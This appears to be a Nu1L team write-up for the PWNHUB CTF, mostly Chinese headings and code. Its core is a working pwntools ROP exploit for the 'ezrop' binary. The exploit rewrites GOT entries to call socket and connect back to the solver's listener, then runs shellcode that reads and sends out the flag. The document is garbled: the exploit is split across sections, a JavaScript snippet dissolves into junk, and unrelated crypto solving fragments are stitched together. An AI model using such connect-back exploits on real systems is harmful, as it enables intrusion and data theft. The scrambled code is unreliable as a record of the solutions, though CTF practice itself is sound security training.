PWNHUB CTF WriteUp By Nu1L
PWNHUB CTF WriteUp By Nu1L
Pwn
ezrop
Reverse
brain
letsgo
Crypto
rootRSA
ezRSA
ezmat
Web
EzPDFParser264
easyCMS
baby_flask
Misc
眼神得好
被偷的flag
Game
是兄弟就来砍我
初⼊⻔径
擂台决⽃
Other
签到
MEDIUMBLACKOCR
WORDS_CHECK
Ppc
BABY LINE
HILBERT
Pwn
ezrop
close(1)
close(2)
close(3)
发现有⼀条gadget是add dword ptr [ebp-0x3d], ebx
可以⽤来任意地址写，⽽且是偏移。造个socket和connect出来重新打开fd后⾯就好做了。
from pwn import *
s = process("./easyrop")
# s = remote("47.97.127.1","23855")
p = listen(9999)
elf = ELF("./easyrop")
# libc = ELF("./libc-2.27.so")
libc = ELF("./libc-2.31.so")
bss = elf.bss(0x500)
add_rbp_3d = 0x0000000000400618
pop_rbx_rbp_4 = 0x4008FA
pop_rdi = 0x0000000000400903
pop_rsi_r15 = 0x0000000000400901
pop_rsp_3 = 0x00000000004008fd
pop_rbp = 0x00000000004005b8
leave_ret = 0x0000000000400821
pts = "/dev/pts/3"
csu_func = 0x4008E0
def setReg(rbx,rbp,rdi,rsi,rdx,func):
    return p64(rbx)+p64(rbp)+p64((func-
rbx*8)&0xffffffffffffffff)+p64(rdi)+p64(rsi)+p64(rdx)
#make syscall,alarm -> syscall
# gdb.attach(s,"b *0x400904\nc")
payload = 
'A'*8+p64(1)+p64(pop_rbx_rbp_4)+p64(0x0f270002)+p64(bss+0x3d)+p64(0)*4+p64(add_rbp_3d)
payload += p64(pop_rbx_rbp_4)+p64(0xbf376627)+p64(bss+4+0x3d)+p64(0)*4+p64(add_rbp_3d)
# payload += 
p64(pop_rbx_rbp_4)+p64(0x0100007f)+p64(bss+4+0x3d)+p64(0)*4+p64(add_rbp_3d)
payload += p64(pop_rbx_rbp_4)+p64(libc.sym['socket']-
libc.sym['alarm'])+p64(elf.got['alarm']+0x3d)
payload += setReg(libc.sym['socket']-libc.sym['alarm'],1,2,1,0,elf.got['alarm'])[2*8:]
payload += p64(add_rbp_3d)+p64(pop_rbp)+p64(libc.sym['socket']-libc.sym['alarm']+1)
payload += p64(csu_func)
payload += 'A'*8+setReg(libc.sym['connect']-
libc.sym['close'],elf.got['close']+0x3d,0,bss,16,elf.got['close'])
payload += p64(add_rbp_3d)+p64(pop_rbp)+p64(libc.sym['connect']-libc.sym['close']+1)
payload += p64(csu_func)
payload += 'A'*8+setReg(0,1,0,bss,0x300,elf.got['read'])+p64(csu_func)
payload += 'A'*8+setReg(0,bss-8,0,0,0,0)+p64(leave_ret)
s.send(payload)
success(hex(len(payload)))
raw_input(">")
context.arch='amd64'
Reverse
brain
3字节遍历爆破2字节数据即可
FRIDA 脚本如下
payload = p64(pop_rbx_rbp_4)+p64((libc.sym['mprotect']-
libc.sym['socket'])&0xffffffffffffffff)+p64(elf.got['alarm']+0x3d)+p64(0)*4+p64(add_rbp
_3d)
payload += 
p64(pop_rbx_rbp_4)+setReg(0,1,bss&0xfffffffffffff000,0x1000,7,elf.got['alarm'])+p64(csu
_func)+'A'*56+p64(bss+0x100)
payload = payload.ljust(0x100,'\x90')
shellcode = ''
shellcode += shellcraft.open("flag",0)
shellcode += shellcraft.read(1,bss+0x300,0x100)
shellcode += shellcraft.write(0,bss+0x300,0x100)
payload += asm(shellcode)
p.send(payload)
flag = p.recv()
success("flag:"+flag)
s.interactive()
var t = '{abcdefgl-0123456789}';
var arr1 = new ArrayBuffer(42);
var arr = new Int8Array(arr1);
for(var j = 0; j -.-.>.--.-[.-
[[.>.-+[. = PolynomialRing(Zmod(n))
f = (2*x0+1)*x + 2*x0^3 - 2*y0^2 - 1
f = f.monic()
q = int(f.small_roots(X=2**512, beta=0.2, epsilon=5/32)[0])
p = n // q
E = EllipticCurve(Zmod(n), [p+q, p^2+(q-1)//2])
Eq = E.change_ring(GF(q))
d = inverse(0x10001, Eq.order())
m_point = Eq((x0, y0)) * d
m = int(m_point.xy()[0])
print(long_to_bytes(m))
# from pwn import *
import requests
import json
import os
import gmpy2
from pwnlib.tubes.tube import *
from hashlib import *
from Crypto.Util.number import *
from tqdm import tqdm, trange
import random
import math
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from factordb.factordb import FactorDB
from sage.modules.free_module_integer import IntegerLattice
import itertools
from fastecdsa.curve import Curve
from random import getrandbits, shuffle
# r = remote('node4.buuoj.cn', '25965')
# context(log_level='debug')
# ALPHABET = string.ascii_letters + string.digits
# rec = r.recvline().decode()
# print(rec)
# suffix = rec[rec.find('+')+1:rec.find(')')]
# digest = rec[rec.find('==')+3:-1]
# print(f"suffix: {suffix} \ndigest: {digest}")
# for i in itertools.product(ALPHABET, repeat=3):
#     prefix = ''.join(i)
#     guess = prefix + suffix
#     if sha256(guess.encode()).hexdigest() == digest:
#         # log.info(f"Find XXXX: {prefix}")
#         print((f"Find XXXX: {prefix}"))
#         break
# r.sendline(prefix.encode())
from output import p, w, MM
# part 2
MM = Matrix(Zmod(2), MM)
ord = MM.multiplicative_order()
d = inverse(0x10001, ord)